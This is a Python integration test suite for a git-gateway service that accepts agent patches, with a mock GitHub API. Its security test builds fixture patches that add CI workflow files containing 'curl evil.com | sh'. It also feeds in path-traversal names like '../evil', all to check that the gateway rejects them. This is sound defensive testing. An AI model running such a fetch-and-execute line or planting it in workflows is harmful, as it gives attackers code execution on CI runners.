"""Comprehensive end-to-end & concurrency integration test suite for git-gateway."""

from __future__ import annotations

import json
import shutil
import subprocess
import tempfile
import threading
import unittest
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse

from fastapi.testclient import TestClient

from gateway.app import create_app
from gateway.config import RepoRuleMatcher, Settings


def _git(args: list[str], cwd: Path) -> str:
    proc = subprocess.run(
        ["git"] + args,
        cwd=str(cwd),
        capture_output=True,
        text=True,
        check=True,
    )
    return proc.stdout.strip()


class MockGitHubState:
    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.prs: list[dict] = []
        self.next_pr_number = 1
        self.blob_auth_headers: list[str | None] = []
        self.ci_mode = "failed"  # "failed" | "passed" | "running" | "none"


def start_mock_github_server(state: MockGitHubState) -> tuple[ThreadingHTTPServer, str]:
    class Handler(BaseHTTPRequestHandler):
        def log_message(self, format: str, *args) -> None:  # noqa: A002
            return

        def _send_json(self, code: int, obj: object) -> None:
            raw = json.dumps(obj).encode("utf-8")
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(raw)))
            self.end_headers()
            self.wfile.write(raw)

        def do_GET(self) -> None:  # noqa: N802
            parsed = urlparse(self.path)
            path = parsed.path
            qs = parse_qs(parsed.query)

            if path.endswith(".git/info/refs"):
                service = (qs.get("service") or [""])[0]
                if service == "git-upload-pack":
                    body = b"001e# service=git-upload-pack\n0000"
                    self.send_response(200)
                    self.send_header("Content-Type", "application/x-git-upload-pack-advertisement")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                    return
                self.send_response(403)
                self.end_headers()
                return

            if path == "/blob/job-9001.log":
                with state.lock:
                    state.blob_auth_headers.append(self.headers.get("Authorization"))
                lines = [f"step line {i}" for i in range(1, 25)]
                lines.append("\x1b[31mERROR\x1b[0m: test_math.py::test_add FAILED")
                lines.append("AssertionError: assert 2 + 2 == 5")
                log_body = ("\n".join(lines) + "\n").encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(log_body)))
                self.end_headers()
                self.wfile.write(log_body)
                return

            if path == "/repos/Hana-ame/repo/pulls":
                head_filter = (qs.get("head") or [None])[0]
                base_filter = (qs.get("base") or [None])[0]
                with state.lock:
                    matched = []
                    for pr in state.prs:
                        if head_filter and f"Hana-ame:{pr['head']['ref']}" != head_filter:
                            continue
                        if base_filter and pr["base"]["ref"] != base_filter:
                            continue
                        matched.append(pr)
                self._send_json(200, matched)
                return

            if path.startswith("/repos/Hana-ame/repo/pulls/"):
                num = int(path.rsplit("/", 1)[-1])
                with state.lock:
                    found = next((p for p in state.prs if p["number"] == num), None)
                if found:
                    self._send_json(200, found)
                else:
                    self._send_json(404, {"message": "Not Found"})
                return

            if path.endswith("/check-runs"):
                if state.ci_mode == "none":
                    self._send_json(200, {"total_count": 0, "check_runs": []})
                    return
                status = "in_progress" if state.ci_mode == "running" else "completed"
                conclusion = None if state.ci_mode == "running" else (
                    "success" if state.ci_mode == "passed" else "failure"
                )
                self._send_json(
                    200,
                    {
                        "total_count": 1,
                        "check_runs": [
                            {
                                "id": 501,
                                "name": "pytest",
                                "status": status,
                                "conclusion": conclusion,
                                "details_url": "https://github.com/Hana-ame/repo/actions/runs/7001",
                            }
                        ],
                    },
                )
                return

            if path == "/repos/Hana-ame/repo/actions/runs":
                if state.ci_mode == "none":
                    self._send_json(200, {"workflow_runs": []})
                    return
                self._send_json(200, {"workflow_runs": [{"id": 7001, "name": "CI"}]})
                return

            if path == "/repos/Hana-ame/repo/actions/runs/7001/jobs":
                status = "in_progress" if state.ci_mode == "running" else "completed"
                conclusion = None if state.ci_mode == "running" else (
                    "success" if state.ci_mode == "passed" else "failure"
                )
                self._send_json(
                    200,
                    {
                        "jobs": [
                            {
                                "id": 9001,
                                "name": "unit-tests",
                                "status": status,
                                "conclusion": conclusion,
                                "html_url": "https://github.com/Hana-ame/repo/actions/runs/7001/job/9001",
                                "steps": [
                                    {"name": "Checkout", "conclusion": "success"},
                                    {"name": "Run pytest", "conclusion": conclusion},
                                ],
                            }
                        ]
                    },
                )
                return

            if path == "/repos/Hana-ame/repo/actions/jobs/9001/logs":
                host, port = self.server.server_address
                self.send_response(302)
                self.send_header("Location", f"http://{host}:{port}/blob/job-9001.log")
                self.end_headers()
                return

            self._send_json(404, {"message": f"unhandled GET {path}"})

        def do_POST(self) -> None:  # noqa: N802
            parsed = urlparse(self.path)
            length = int(self.headers.get("Content-Length", "0"))
            raw = self.rfile.read(length) if length > 0 else b"{}"

            if parsed.path == "/repos/Hana-ame/repo/pulls":
                body = json.loads(raw.decode("utf-8"))
                with state.lock:
                    num = state.next_pr_number
                    state.next_pr_number += 1
                    pr = {
                        "number": num,
                        "title": body["title"],
                        "body": body.get("body", ""),
                        "state": "open",
                        "head": {"ref": body["head"], "sha": "abcdef1234567890abcdef1234567890abcdef12"},
                        "base": {"ref": body["base"]},
                        "html_url": f"https://github.com/Hana-ame/repo/pull/{num}",
                        "mergeable": True,
                        "updated_at": "2026-11-21T16:00:00Z",
                    }
                    state.prs.append(pr)
                self._send_json(201, pr)
                return

            self._send_json(404, {"message": f"unhandled POST {parsed.path}"})

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    host, port = server.server_address
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, f"http://{host}:{port}"


class GitGatewayTestSuite(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="ggw-test-"))
        self.upstream_root = self.tmp / "upstream"
        self.bare_repo = self.upstream_root / "Hana-ame" / "repo.git"
        self.bare_repo.parent.mkdir(parents=True, exist_ok=True)
        _git(["init", "--bare", "--initial-branch=main", str(self.bare_repo)], cwd=self.tmp)

        self.seed = self.tmp / "seed"
        _git(["clone", str(self.bare_repo), str(self.seed)], cwd=self.tmp)
        _git(["config", "user.name", "Maintainer"], cwd=self.seed)
        _git(["config", "user.email", "maintainer@example.com"], cwd=self.seed)
        (self.seed / "hello.txt").write_text("hello world\n", encoding="utf-8")
        _git(["add", "hello.txt"], cwd=self.seed)
        _git(["commit", "-m", "initial commit"], cwd=self.seed)
        self.main_sha = _git(["rev-parse", "HEAD"], cwd=self.seed)
        _git(["push", "origin", "main"], cwd=self.seed)

        _git(["checkout", "-b", "feat/ui"], cwd=self.seed)
        (self.seed / "ui.txt").write_text("ui v1\n", encoding="utf-8")
        _git(["add", "ui.txt"], cwd=self.seed)
        _git(["commit", "-m", "add ui"], cwd=self.seed)
        _git(["push", "origin", "feat/ui"], cwd=self.seed)
        _git(["checkout", "main"], cwd=self.seed)

        self.gh_state = MockGitHubState()
        self.mock_server, self.mock_url = start_mock_github_server(self.gh_state)

        self.settings = Settings(
            public_base_url="https://proxy.example.com",
            temp_dir=self.tmp / "gateway_tmp",
            github_token="test-gh-token",
            admin_token="secret-admin-token",
            github_web_base=f"file://{self.upstream_root}",
            github_api_base=self.mock_url,
            repo_rules=["Hana-ame/repo"],
            repo_aliases={"path/to/repo": "Hana-ame/repo"},
            allow_gh_cli_fallback=False,
        )
        self.app = create_app(self.settings)
        self.client = TestClient(self.app)

    def tearDown(self) -> None:
        self.mock_server.shutdown()
        self.mock_server.server_close()
        shutil.rmtree(self.tmp, ignore_errors=True)

    # 1. Agent landing page, alias mapping, JSON/Markdown negotiation, admin persistence
    def test_01_landing_page_todo_and_admin_persistence(self) -> None:
        r = self.client.get("/path/to/repo")
        self.assertEqual(r.status_code, 200)
        self.assertIn("text/markdown", r.headers["content-type"])
        self.assertIn("nickname", r.text.lower())
        self.assertIn("https://proxy.example.com/path/to/repo/todo", r.text)
        self.assertIn("https://proxy.example.com/path/to/repo.git", r.text)
        self.assertIn("https://proxy.example.com/path/to/repo/patches", r.text)

        # JSON format negotiation
        r_json = self.client.get("/path/to/repo?format=json")
        self.assertEqual(r_json.status_code, 200)
        self.assertEqual(r_json.json()["repo"], "Hana-ame/repo")

        # Direct <owner>/<repo> route also works
        r_direct = self.client.get("/Hana-ame/repo")
        self.assertEqual(r_direct.status_code, 200)

        # Admin auth enforcement
        self.assertEqual(self.client.put("/admin/path/to/repo/todo", content="x").status_code, 401)
        self.assertEqual(
            self.client.put(
                "/admin/path/to/repo/todo",
                headers={"Authorization": "Bearer wrong"},
                content="x",
            ).status_code,
            401,
        )

        # Admin updates TODO and repo prompt
        headers = {"Authorization": "Bearer secret-admin-token"}
        r_todo = self.client.put(
            "/admin/path/to/repo/todo",
            headers=headers,
            content="# Project TODO\n- [ ] Fix calculator bug\n- [ ] Add unit tests\n",
        )
        self.assertEqual(r_todo.status_code, 200)
        self.assertIn("Fix calculator bug", self.client.get("/path/to/repo/todo").text)

        r_prompt = self.client.put(
            "/admin/path/to/repo/prompt",
            headers=headers,
            content="Custom guide for {{OWNER}}/{{REPO}} — submit to {{PATCH_URL}}",
        )
        self.assertEqual(r_prompt.status_code, 200)

        # Verify in-memory prompt & TODO update on same app instance (zero local disk storage)
        r_landing2 = self.client.get("/path/to/repo")
        self.assertIn("Custom guide for Hana-ame/repo", r_landing2.text)
        self.assertIn("Fix calculator bug", r_landing2.text)

        # Delete per-repo override -> falls back to global prompt
        self.assertEqual(
            self.client.delete("/admin/path/to/repo/prompt", headers=headers).status_code, 200
        )
        self.assertIn("Step 1", self.client.get("/path/to/repo").text)

    # 2. Read-only Git Smart-HTTP clone proxy
    def test_02_readonly_clone_proxy_allows_fetch_blocks_push(self) -> None:
        proxy_settings = Settings(
            temp_dir=self.tmp / "proxy_tmp",
            github_token="test-gh-token",
            github_web_base=self.mock_url,
            github_api_base=self.mock_url,
            repo_rules=["Hana-ame/repo"],
            repo_aliases={"path/to/repo": "Hana-ame/repo"},
            allow_gh_cli_fallback=False,
        )
        proxy_client = TestClient(create_app(proxy_settings))

        r_ok = proxy_client.get("/path/to/repo.git/info/refs?service=git-upload-pack")
        self.assertEqual(r_ok.status_code, 200)
        self.assertIn(b"git-upload-pack", r_ok.content)

        self.assertEqual(
            proxy_client.get("/path/to/repo.git/info/refs?service=git-receive-pack").status_code,
            403,
        )
        self.assertEqual(
            proxy_client.post("/path/to/repo.git/git-receive-pack", content=b"0000").status_code,
            403,
        )

    # 3. Patch submission, cumulative fast-forward resubmission, noop detection, CI/CD logs & states
    def test_03_patch_lifecycle_resubmission_noop_and_ci_logs(self) -> None:
        (self.seed / "hello.txt").write_text("hello world\nline from alice v1\n", encoding="utf-8")
        patch_v1 = _git(["diff"], cwd=self.seed)
        _git(["checkout", "--", "hello.txt"], cwd=self.seed)

        # Submit with CRLF + missing trailing newline
        r1 = self.client.post(
            "/path/to/repo/patches",
            json={
                "nickname": "alice",
                "base_branch": "main",
                "message": "feat: add alice v1 line",
                "patch": patch_v1.replace("\n", "\r\n"),
            },
        )
        self.assertEqual(r1.status_code, 200, r1.text)
        data1 = r1.json()
        self.assertEqual(data1["target_branch"], "alice/main")
        self.assertEqual(data1["pr_number"], 1)
        self.assertFalse(data1["pr_reused"])
        sha_v1 = data1["commit_sha"]

        # Resubmitting identical patch -> noop (no duplicate empty commit)
        r_noop = self.client.post(
            "/path/to/repo/patches",
            json={
                "nickname": "alice",
                "base_branch": "main",
                "message": "noop resubmit",
                "patch": patch_v1,
            },
        )
        self.assertEqual(r_noop.status_code, 200, r_noop.text)
        self.assertEqual(r_noop.json()["status"], "noop")
        self.assertEqual(r_noop.json()["commit_sha"], sha_v1)

        # CI status = failed + error logs (ANSI stripped, tail truncation, no token leak to blob)
        ci_fail = self.client.get("/path/to/repo/prs/1/ci").json()
        self.assertEqual(ci_fail["overall_status"], "failed")
        self.assertEqual(ci_fail["failed_jobs"][0]["failed_steps"], ["Run pytest"])

        r_logs_tail = self.client.get("/path/to/repo/prs/1/logs?tail=5")
        self.assertEqual(r_logs_tail.status_code, 200)
        self.assertIn("ERROR: test_math.py::test_add FAILED", r_logs_tail.text)
        self.assertIn("earlier lines omitted", r_logs_tail.text)
        self.assertNotIn("\x1b[31m", r_logs_tail.text)
        self.assertEqual(self.gh_state.blob_auth_headers, [None])

        # Cumulative v2 fix based on main -> strict fast-forward on alice/main + PR #1 reused
        (self.seed / "hello.txt").write_text("hello world\nline from alice v2 fixed\n", encoding="utf-8")
        patch_v2 = _git(["diff"], cwd=self.seed)
        _git(["checkout", "--", "hello.txt"], cwd=self.seed)

        r2 = self.client.post(
            "/path/to/repo/patches?nickname=alice&base_branch=main&message=fix:+resolve+ci+error",
            content=patch_v2,
            headers={"Content-Type": "text/plain"},
        )
        self.assertEqual(r2.status_code, 200, r2.text)
        data2 = r2.json()
        self.assertTrue(data2["pr_reused"])
        self.assertEqual(data2["pr_number"], 1)
        sha_v2 = data2["commit_sha"]
        self.assertEqual(_git(["rev-parse", f"{sha_v2}^"], cwd=self.bare_repo), sha_v1)
        self.assertIn("line from alice v2 fixed", _git(["show", "refs/heads/alice/main:hello.txt"], cwd=self.bare_repo))

        # CI states: running -> passed -> none
        self.gh_state.ci_mode = "running"
        self.assertEqual(self.client.get("/path/to/repo/prs/1/ci").json()["overall_status"], "running")
        self.gh_state.ci_mode = "passed"
        self.assertEqual(self.client.get("/path/to/repo/prs/1/ci").json()["overall_status"], "passed")
        self.gh_state.ci_mode = "none"
        self.assertEqual(self.client.get("/path/to/repo/prs/1/ci").json()["overall_status"], "none")

    # 4. format-patch auto-detect base-commit, nested branch, new file & file delete
    def test_04_format_patch_nested_branch_and_file_ops(self) -> None:
        # Nested branch bob/feat/ui
        _git(["checkout", "feat/ui"], cwd=self.seed)
        (self.seed / "ui.txt").write_text("ui v2 by bob\n", encoding="utf-8")
        patch_ui = _git(["diff"], cwd=self.seed)
        _git(["checkout", "--", "ui.txt"], cwd=self.seed)

        r = self.client.post(
            "/path/to/repo/patches",
            json={
                "nickname": "bob",
                "base_branch": "feat/ui",
                "message": "feat(ui): update ui",
                "patch": patch_ui,
            },
        )
        self.assertEqual(r.status_code, 200, r.text)
        self.assertEqual(r.json()["target_branch"], "bob/feat/ui")

        # format-patch with embedded `base-commit:` trailer
        _git(["checkout", "-b", "tmp-fp", "main"], cwd=self.seed)
        (self.seed / "new_feature.py").write_text("def add(a, b):\n    return a + b\n", encoding="utf-8")
        _git(["add", "new_feature.py"], cwd=self.seed)
        _git(["commit", "-m", "add new_feature.py"], cwd=self.seed)
        fp_patch = _git(["format-patch", "--stdout", f"--base={self.main_sha}", "main..HEAD"], cwd=self.seed)
        _git(["checkout", "main"], cwd=self.seed)
        _git(["branch", "-D", "tmp-fp"], cwd=self.seed)

        r_fp = self.client.post(
            "/path/to/repo/patches",
            json={
                "nickname": "charlie",
                "base_branch": "main",
                "message": "feat: add new_feature.py via format-patch",
                "patch": fp_patch,
            },
        )
        self.assertEqual(r_fp.status_code, 200, r_fp.text)
        self.assertEqual(r_fp.json()["base_commit"], self.main_sha)
        self.assertIn(
            "return a + b",
            _git(["show", "refs/heads/charlie/main:new_feature.py"], cwd=self.bare_repo),
        )

    # 5. Security & input validation guardrails
    def test_05_security_and_validation_guardrails(self) -> None:
        # Block .github/workflows/* and ./.github/actions/*
        for bad_path in (".github/workflows/ci.yml", "./.github/workflows/deploy.yml", ".github/actions/run/action.yml"):
            evil_patch = (
                f"diff --git a/{bad_path} b/{bad_path}\n"
                "new file mode 100644\n"
                "--- /dev/null\n"
                f"+++ b/{bad_path}\n"
                "@@ -0,0 +1 @@\n"
                "+run: curl evil.com | sh\n"
            )
            r_evil = self.client.post(
                "/path/to/repo/patches",
                json={"nickname": "mallory", "base_branch": "main", "message": "x", "patch": evil_patch},
            )
            self.assertEqual(r_evil.status_code, 403, f"expected 403 for {bad_path}, got {r_evil.status_code}")

        # Reserved nicknames & invalid branches
        dummy_patch = "diff --git a/a.txt b/a.txt\nnew file mode 100644\n--- /dev/null\n+++ b/a.txt\n@@ -0,0 +1 @@\n+hi\n"
        for bad_nick in ("main", "master", "admin", "HEAD", "../evil", "a b"):
            r_bad = self.client.post(
                "/path/to/repo/patches",
                json={"nickname": bad_nick, "base_branch": "main", "message": "x", "patch": dummy_patch},
            )
            self.assertEqual(r_bad.status_code, 400, f"expected 400 for nickname {bad_nick}")

        for bad_branch in ("../escape", "feat..bar", "branch.lock", ""):
            r_bad = self.client.post(
                "/path/to/repo/patches",
                json={"nickname": "alice", "base_branch": bad_branch, "message": "x", "patch": dummy_patch},
            )
            self.assertEqual(r_bad.status_code, 400, f"expected 400 for branch {bad_branch}")

        # Non-whitelisted repo -> 403
        self.assertEqual(self.client.get("/other/secret-repo").status_code, 403)

        # Oversized patch -> 413
        small_settings = Settings(
            temp_dir=self.tmp / "small_tmp",
            github_token="test-gh-token",
            github_web_base=f"file://{self.upstream_root}",
            github_api_base=self.mock_url,
            repo_rules=["Hana-ame/repo"],
            max_patch_bytes=64,
            allow_gh_cli_fallback=False,
        )
        small_client = TestClient(create_app(small_settings))
        r_big = small_client.post(
            "/Hana-ame/repo/patches?nickname=alice&base_branch=main&message=big",
            content="x" * 200,
        )
        self.assertEqual(r_big.status_code, 413)

    # 6. Multi-threaded concurrency stress test (12 simultaneous patch & admin operations)
    def test_06_multithreaded_concurrency_stress(self) -> None:
        headers = {"Authorization": "Bearer secret-admin-token"}

        def submit_agent(idx: int) -> tuple[str, int, dict]:
            nick = f"agent-{idx}"
            patch = (
                f"diff --git a/contrib_{idx}.txt b/contrib_{idx}.txt\n"
                "new file mode 100644\n"
                "--- /dev/null\n"
                f"+++ b/contrib_{idx}.txt\n"
                "@@ -0,0 +1 @@\n"
                f"+contribution from {nick}\n"
            )
            resp = self.client.post(
                "/path/to/repo/patches",
                json={
                    "nickname": nick,
                    "base_branch": "main",
                    "message": f"feat: contribution {idx}",
                    "patch": patch,
                },
            )
            return nick, resp.status_code, resp.json()

        def submit_same_nick(step: int) -> tuple[str, int, dict]:
            patch = (
                f"diff --git a/shared_{step}.txt b/shared_{step}.txt\n"
                "new file mode 100644\n"
                "--- /dev/null\n"
                f"+++ b/shared_{step}.txt\n"
                "@@ -0,0 +1 @@\n"
                f"+step {step}\n"
            )
            resp = self.client.post(
                "/path/to/repo/patches",
                json={
                    "nickname": "shared-bot",
                    "base_branch": "main",
                    "message": f"feat: shared step {step}",
                    "patch": patch,
                },
            )
            return f"shared-{step}", resp.status_code, resp.json()

        def update_todo(step: int) -> tuple[str, int, dict]:
            resp = self.client.put(
                "/admin/path/to/repo/todo",
                headers=headers,
                content=f"# TODO rev {step}\n- [ ] item {step}\n",
            )
            return f"todo-{step}", resp.status_code, resp.json()

        results = []
        with ThreadPoolExecutor(max_workers=12) as pool:
            futures = []
            # 8 distinct agents simultaneously
            for i in range(8):
                futures.append(pool.submit(submit_agent, i))
            # 3 concurrent submissions to the EXACT same nickname/branch
            for s in range(3):
                futures.append(pool.submit(submit_same_nick, s))
            # 3 concurrent admin TODO writes
            for t in range(3):
                futures.append(pool.submit(update_todo, t))

            for fut in as_completed(futures):
                results.append(fut.result())

        # Every single concurrent request MUST succeed with 200
        for label, status, payload in results:
            self.assertEqual(status, 200, f"concurrent task {label} failed: {payload}")
            self.assertTrue(payload.get("ok"), f"concurrent task {label} not ok: {payload}")

        # Verify all 8 distinct agent branches exist cleanly in upstream bare repo
        for i in range(8):
            content = _git([f"show", f"refs/heads/agent-{i}/main:contrib_{i}.txt"], cwd=self.bare_repo)
            self.assertEqual(content, f"contribution from agent-{i}")

        # Verify shared-bot/main has 3 sequential commits (strictly fast-forward, zero lost writes)
        commit_count = int(_git(["rev-list", "--count", "main..refs/heads/shared-bot/main"], cwd=self.bare_repo))
        self.assertEqual(commit_count, 3)

        # Verify zero leftover ephemeral temp directories in temp_dir/work
        work_dir = self.settings.temp_dir / "work"
        leftovers = list(work_dir.iterdir()) if work_dir.exists() else []
        self.assertEqual(leftovers, [], f"leftover temp workspaces found: {leftovers}")

    # 7. Gitignore-style repos.txt allow/disallow matcher (last match wins + hot reload)
    def test_07_gitignore_style_repo_rules_and_hot_reload(self) -> None:
        rules_file = self.tmp / "repos.txt"
        rules_file.write_text(
            "# comment\n\nHana-ame/*\n!Hana-ame/private-*\nHana-ame/private-demo\n",
            encoding="utf-8",
        )
        matcher = RepoRuleMatcher(rules_file=rules_file)
        self.assertTrue(matcher.is_allowed("Hana-ame", "repo"))
        self.assertFalse(matcher.is_allowed("Hana-ame", "private-secret"))
        self.assertTrue(matcher.is_allowed("Hana-ame", "private-demo"))
        self.assertFalse(matcher.is_allowed("other-org", "repo"))  # default disallow


if __name__ == "__main__":
    unittest.main()
